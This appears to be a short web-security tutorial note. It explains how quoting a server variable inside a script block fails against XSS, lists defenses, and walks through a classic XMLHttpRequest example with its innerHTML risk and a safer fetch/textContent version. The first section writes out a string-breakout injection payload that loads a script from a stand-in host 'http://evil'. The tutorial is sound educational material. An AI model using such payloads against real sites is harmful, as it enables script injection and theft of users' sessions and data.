# 01 - XSS and AJAX Basics

## Cross-Site Scripting (XSS)

### Quoting Variables in Script Blocks

A common pattern for embedding server-side variables in JavaScript:

```html
<script>
alert("$var1");
</script>
```

Wrapping `$var1` in double quotes prevents simple tag injection like `<script src=http://evil></script>` — the browser treats it as a string literal, not HTML.

**But this is not a complete defense.** An attacker can break out of the string context:

```
$var1 = "); </script><script src=http://evil></script><script>("
```

Result:

```html
<script>
alert(""); </script><script src=http://evil></script><script>("");
</script>
```

The attacker closes the string, closes the script tag, and injects their own script.

### Proper XSS Defenses

- HTML-encode output (`&lt;`, `&gt;`, `&quot;`)
- Use Content Security Policy (CSP) headers
- Use JavaScript-specific encoding inside `<script>` blocks (escape `</`, `"`, `'`, `\`)
- Avoid inline scripts — pass data via `data-` attributes and read from external JS
- Use `textContent` instead of `innerHTML` when inserting text

---

## AJAX with XMLHttpRequest

The old-school way of fetching data asynchronously before `fetch()` existed.

### Classic Example

```html
<html>
<head>
<script type="text/javascript">
var xmlhttp;

function loadXMLDoc(url) {
  xmlhttp = null;
  if (window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
  } else if (window.ActiveXObject) {
    // IE5/6 fallback (obsolete)
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
  }

  if (xmlhttp != null) {
    xmlhttp.onreadystatechange = state_Change;
    xmlhttp.open("GET", url, true);
    xmlhttp.send(null);
  } else {
    alert("Your browser does not support XMLHTTP.");
  }
}

function state_Change() {
  if (xmlhttp.readyState == 4) {   // 4 = loaded
    if (xmlhttp.status == 200) {   // 200 = OK
      document.getElementById('T1').innerHTML = xmlhttp.responseText;
    } else {
      alert("Problem retrieving data:" + xmlhttp.statusText);
    }
  }
}
</script>
</head>

<body onload="loadXMLDoc('/example/xdom/test_xmlhttp.txt')">
  <div id="T1" style="border:1px solid black;height:40;width:300;padding:5"></div>
  <button onclick="loadXMLDoc('/example/xdom/test_xmlhttp2.txt')">Click</button>
</body>
</html>
```

### How It Works

1. On page load, fetches `test_xmlhttp.txt` and displays its content in `<div id="T1">`
2. Clicking the button fetches `test_xmlhttp2.txt` and replaces the div content
3. `loadXMLDoc()` creates the request object and sends a GET request
4. `state_Change()` callback fires on state changes — when complete (`readyState == 4`) and successful (`status == 200`), it injects the response into the div

### Security Concerns

- `innerHTML = xmlhttp.responseText` is an XSS risk — if the response contains untrusted content, an attacker could inject `<script>` tags or event handlers
- The global `xmlhttp` variable means concurrent requests would clobber each other

### Modern Equivalent

```javascript
fetch('/example/xdom/test_xmlhttp.txt')
  .then(res => res.text())
  .then(text => document.getElementById('T1').textContent = text);
```

Using `textContent` instead of `innerHTML` eliminates the XSS risk.
